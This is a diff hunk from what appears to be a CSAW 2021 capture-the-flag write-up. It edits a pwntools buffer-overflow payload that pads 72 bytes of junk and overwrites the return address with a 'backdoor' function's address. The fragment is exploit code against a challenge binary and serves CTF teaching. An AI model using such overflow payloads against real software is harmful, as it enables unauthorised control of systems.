@@ -37,6 +37,7 @@ Our final [payload](https://github.com/CR15PR/CSAW2021/blob/main/warm-up/Passwor
   ```back_door = p64(password_elf.symbols.backdoor)
   OFFSET = 72
   junk = b"A" * OFFSET
+  back_door = p64(password_elf.symbols.backdoor)
   
   payload = [
     junk,
